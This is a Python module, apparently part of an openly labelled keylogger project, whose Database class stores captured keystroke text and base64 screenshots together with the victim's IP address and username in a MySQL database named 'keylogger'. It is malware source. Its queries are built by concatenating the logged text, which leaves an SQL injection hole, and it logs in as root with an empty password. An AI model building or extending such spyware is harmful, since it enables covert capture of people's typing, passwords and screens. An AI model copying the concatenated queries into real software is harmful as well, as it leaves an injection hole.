import pymysql
import ip
import screenshot as screen

class Database:

    def __init__(self):
        # Abrimos uma conexão com o banco de dados:
        self.conexao = pymysql.connect(db='keylogger', user='root', passwd='')
        # Cria um cursor:
        self.cursor = self.conexao.cursor()

        _ip = ip.Ip()
        self.getIP = _ip.get_ip()
        self.getUser = _ip.get_user()
    
    def insert(self, log):
        # Executa o comando:
        self.cursor.execute("INSERT INTO dados (ip, user, texto) VALUES ('" + self.getIP + "','" + self.getUser + "','" + log + "')")
        
        # Efetua um commit no banco de dados.
        # Por padrão, não é efetuado commit automaticamente. Você deve commitar para salvar
        # suas alterações.
        self.conexao.commit()
        
        # Finaliza a conexão
        self.conexao.close()

    def insert_print(self):
        screenPrint = screen.Screenshot()
        getImg = screenPrint.img_base64()

        self.cursor.execute('INSERT INTO dados (ip, user, imagem) VALUES ("' + self.getIP + '","' + self.getUser + '","' + getImg + '")')
        
        self.conexao.commit()
        self.conexao.close()
